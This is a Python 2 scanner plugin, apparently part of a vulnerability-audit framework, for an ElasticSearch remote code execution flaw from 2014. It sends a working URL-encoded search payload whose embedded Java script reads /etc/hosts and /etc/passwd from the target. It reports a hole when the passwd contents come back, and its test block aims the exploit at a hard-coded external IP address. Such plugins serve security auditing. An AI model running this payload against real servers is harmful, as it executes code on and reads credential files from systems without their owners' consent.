#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import * 

info = {
	'NAME':'ElasticSearch Remote Code Exection',
	'AUTHOR':'yangbh',
	'TIME':'20141124',
	'WEB':'http://www.wooyun.org/bugs/wooyun-2014-061672',
	'DESCRIPTION':'ElasticSearch 远程代码执行'
}

def Assign(services):
	if services.has_key('ip') and services.has_key('ports'):
		if 9200 in services['ports']:
			return True
	return False

def Audit(services):
	retinfo = None
	output = ''
	
	flag = False
	if services.has_key('port_detail') and services['port_detail'][9200]['name'] != 'http':
		return (retinfo,output)
	url = 'http://' + services['ip'] + ':9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=jQuery111107529820275958627_1400564696673&_=1400564696674'
	rqu = requests.get(url)
	# print rqu.text
	if rqu.status_code==200 and '/etc/passwd' in rqu.text:
		# print rqu.text
		logger(rqu.text)
		security_hole(url)
		
	return (retinfo,output)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'ip':'221.123.140.66','ports':[9200]}
	pprint(Audit(services))
	pprint(services)